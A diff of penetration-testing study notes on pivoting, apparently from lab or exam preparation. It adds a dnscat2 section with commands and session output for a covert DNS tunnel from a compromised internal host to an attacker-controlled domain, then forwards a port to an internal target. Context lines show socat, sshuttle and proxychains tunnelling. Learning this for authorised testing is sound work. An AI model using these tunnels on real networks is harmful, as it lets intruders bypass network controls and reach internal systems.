@@ -50,7 +50,7 @@ socat TCP-LISTEN:2222,fork TCP:host_c:22
 `kali@kali:~$ sshuttle -r database_admin@host_b:2222 10.4.50.0/24 172.16.50.0/24`
 ```
 
-### Chisel
+### Chisel - via http 
 - A: let compromised host access to a remote port, localhost is able to visit, but  compromised host cannot, in another word, this port only open for localhost
  server set on localhost, this listening IP is used for create tunnel <br>
 > on compromised host:<br>
@@ -90,6 +90,31 @@ R:port(localhost):3edhostIP:port(3rd)
 proxychains nmap -sT -Pn -n -p 22,80,443 IP
 
 ```
+### dnscat2
+//force traffic through DNS
+require we own the DNS authrorized server in the external network, and a compromised internal host that can access to target host'port
+```
+dnscat2-server feline.corp   //or a domainname we set 
+
+//in compromised host_b
+./dnscat feline.corp
+
+//back to DNS server
+dnscat2> New window created: 1
+Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+
+windows
+0 :: main [active]
+  crypto-debug :: Debug window for crypto stuff [*]
+  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
+  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
+dnscat2> window -i 1
+
+listen 0.0.0.0:port_we_set target_host_c:target_port
+
+//now the port is open for public on DNS server, we are able to access from kali
+```
+
 
 ### For Win
 ##### SSH
